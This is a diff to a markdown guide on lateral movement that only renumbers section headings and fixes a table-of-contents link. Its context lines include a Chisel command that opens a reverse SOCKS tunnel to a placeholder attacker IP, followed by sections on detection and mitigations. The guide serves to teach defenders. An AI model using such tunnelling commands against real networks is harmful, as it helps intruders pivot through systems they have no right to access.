@@ -16,7 +16,7 @@
     - [SSH Pivoting / Port Forwarding](#ssh-pivoting--port-forwarding)
     - [Using Chisel / Ligolo / Proxychains](#using-chisel--ligolo--proxychains)
 4. [Detecting Lateral Movement](#detecting-lateral-movement)
-5. [Mitigations & Best Practices](#mitigations--best-practices)
+5. [Mitigations & Best Practices](#mitigations-best-practices)
 6. [Conclusion](#conclusion)
 
   ---
@@ -116,7 +116,7 @@ Client:
 chisel client <attacker-ip>:8000 R:1080:socks
 ```
 
-## 4. Detecting Lateral Movement
+## Detecting Lateral Movement
 
 Detection strategies include:
 
@@ -130,7 +130,7 @@ Detection strategies include:
 - Honeypots — Deploy decoy credentials or hosts to detect unauthorized movement.
 
 ---
-## 5. Mitigations & Best Practices
+## Mitigations & Best Practices
 
 - Enforce Multi-Factor Authentication (MFA) for privileged accounts.
 - Limit Lateral Movement Paths — Segment networks and apply least privilege.
@@ -140,6 +140,6 @@ Detection strategies include:
 - Implement Monitoring & Alerting — SIEM rules for unusual account usage.
 
 ---
-## 6. Conclusion
+## Conclusion
 
 Lateral movement is a key phase in post-exploitation that allows attackers to expand access and target critical assets. Understanding the techniques, being able to detect them, and applying strong mitigations is essential for reducing risk. Combining **proactive defense** with **continuous monitoring** will significantly improve resilience against these threats.
